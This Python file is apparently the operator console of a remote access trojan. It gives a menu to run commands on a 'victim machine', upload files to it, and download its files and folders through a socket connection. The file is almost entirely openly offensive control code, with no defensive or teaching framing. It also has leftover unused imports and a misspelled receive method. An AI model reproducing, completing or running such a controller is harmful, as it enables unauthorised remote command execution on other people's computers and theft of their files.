
import os

from fileinput import filename
from yaml import compose_all


def showOptions():
    print("\n")
    print("\t\t 1. Run Command on victim machine")
    print("\t\t 2. Upload file")
    print("\t\t 3. Download Files and folder from the victim machine")
    

def handleConnection(my_socket):
    print("[+] Handling Connection")
    
    while(True):
        showOptions()
        
        user_input = input("[+] Select Option: ")
        my_socket.send_data(user_input)

        
        if user_input == "1":
            print("Running Commands:")
            while(True):
                print(">>>" , end = " ")
                command = input()
                if command == "##stop##":
                    break

                my_socket.send_data(command)

                result = my_socket.recieve_data()
                print(result)


        elif user_input == '2':
            print("Send files")
            
            file_path = input("Enter File path: ")
            fname = os.path.basename(file_path)


            my_socket.send_data(fname)
        
            
            my_socket.upload_file(file_path)
        elif user_input == "3":
            print("Download files from the victim")
            my_socket.download_file()
            

        elif (user_input == "99"):
            break
        else:
            print("[-] Invalid Input")
    
        


